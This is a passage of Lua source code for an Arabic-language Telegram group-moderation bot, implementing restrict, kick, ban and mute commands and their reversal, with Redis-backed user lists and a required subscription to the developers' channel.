sent = "\n• الكتم : ✔️"
else
sent = "\n• الكتم : ❌"
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", Remsg.sender.user_id) then
an = "\n• الحظر : ✔️"
else
an = "\n• الحظر : ❌"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*━━━━━━━━━━━\n"..Banal.."\n"..silental.."\n"..rict..""..sent..""..an.."*").helo,"md",true)  
return false
end
if text and text:match('^تقييد (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^تقييد (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه تقييد الاعضاء* ',"md",true)  
return false
end
if not Norank(UserName,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اقيد "..Get_Rank(UserName,msg.chat_id).."*"
else
t = "*↯︙تم قيدته*"
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":restrict",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^تقييد @(%S+)$') then
local UserName = text:match('^تقييد @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه تقييد الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اقيد "..Get_Rank(UserId_Info.id,msg.chat_id).."*"
else
t = "*↯︙تم قيدته*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":restrict",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)    
end
if text == "تقييد" and tonumber(msg.reply_to_message_id) ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه تقييد الاعضاء* ',"md",true)  
return false
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اقيد "..Get_Rank(Remsg.sender.user_id,msg.chat_id).."*"
else
t = "*↯︙تم قيدته*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":restrict",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
end
if text and text:match('^الغاء تقييد (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء تقييد (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم الغاء  تقييده *"
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء تقييد @(%S+)$') then
local UserName = text:match('^الغاء تقييد @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم الغاء  تقييده *"
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء تقييد" and tonumber(msg.reply_to_message_id) ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم الغاء  تقييده *"
redis:srem(bot_id..":"..msg.chat_id..":restrict",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^طرد (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^طرد (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الطرد معطل من قبل المنشئين الاساسيين*").yu,"md",true)
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if not Norank(UserName,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اطرد "..Get_Rank(UserName,msg.chat_id).."*"
else
t = "*↯︙تم طردته*"
bot.setChatMemberStatus(msg.chat_id,UserName,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^طرد @(%S+)$') then
local UserName = text:match('^طرد @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*- اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الطرد معطل من قبل المنشئين الاساسيين*").yu,"md",true)
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اطرد "..Get_Rank(UserId_Info.id,msg.chat_id).."*"
else
t = "*↯︙تم طردته*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)    
end
if text == "طرد" and tonumber(msg.reply_to_message_id) ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الطرد معطل من قبل المنشئين الاساسيين*").yu,"md",true)
return false
end
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اطرد "..Get_Rank(Remsg.sender.user_id,msg.chat_id).."*"
else
t = "*↯︙تم طردته*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
end
if text and text:match('^حظر (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^حظر (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الحظر معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if not Norank(UserName,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(UserName,msg.chat_id).."*"
else
t = "*↯︙تم حظرة*"
bot.setChatMemberStatus(msg.chat_id,UserName,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^حظر @(%S+)$') then
local UserName = text:match('^حظر @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الحظر معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(UserId_Info.id,msg.chat_id).."*"
else
t = "*↯︙تم حظرة*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)    
end
if text == "حظر" and tonumber(msg.reply_to_message_id) ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الحظر معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(Remsg.sender.user_id,msg.chat_id).."*"
else
t = "*↯︙تم حظرة*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
end
if text and text:match('^الغاء حظر (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء حظر (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم الغاء  حظره *"
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء حظر @(%S+)$') then
local UserName = text:match('^الغاء حظر @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم الغاء  حظره *"
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء حظر" and tonumber(msg.reply_to_message_id) ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم الغاء  حظره *"
redis:srem(bot_id..":"..msg.chat_id..":Ban",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^كتم (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كتم (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الكتم معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if not Norank(UserName,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(UserName,msg.chat_id).."*"
else
t = "*↯︙تم كتمه في المجموعة*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^كتم @(%S+)$') then
local UserName = text:match('^كتم @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الكتم معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(UserId_Info.id,msg.chat_id).."*"
else
t = "*↯︙تم كتمه في المجموعة*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)    
end
if text == "كتم" and tonumber(msg.reply_to_message_id) ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الكتم معطل من قبل المنشئين الاساسيين*").yu,"md",true)  
return false
end
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(Remsg.sender.user_id,msg.chat_id).."*"
else
t = "*↯︙تم كتمه في المجموعة*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
end
if text and text:match('^الغاء كتم (%d+)$') or text and text:match('^الغاء الكتم (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء كتم (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم الغاء  كتمه *"
redis:srem(bot_id..":"..msg.chat_id..":silent",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^الغاء كتم @(%S+)$') then
local UserName = text:match('^الغاء كتم @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم الغاء  كتمه *"
redis:srem(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
end
if text and text:match('^الغاء الكتم @(%S+)$') then
local UserName = text:match('^الغاء الكتم @(%S+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم الغاء  كتمه *"
redis:srem(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
end
if text == "الغاء كتم" or text == "الغاء الكتم" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم الغاء  كتمه *"
redis:srem(bot_id..":"..msg.chat_id..":silent",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).helo,"md",true)  
end
if text == 'المكتومين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":silent") 
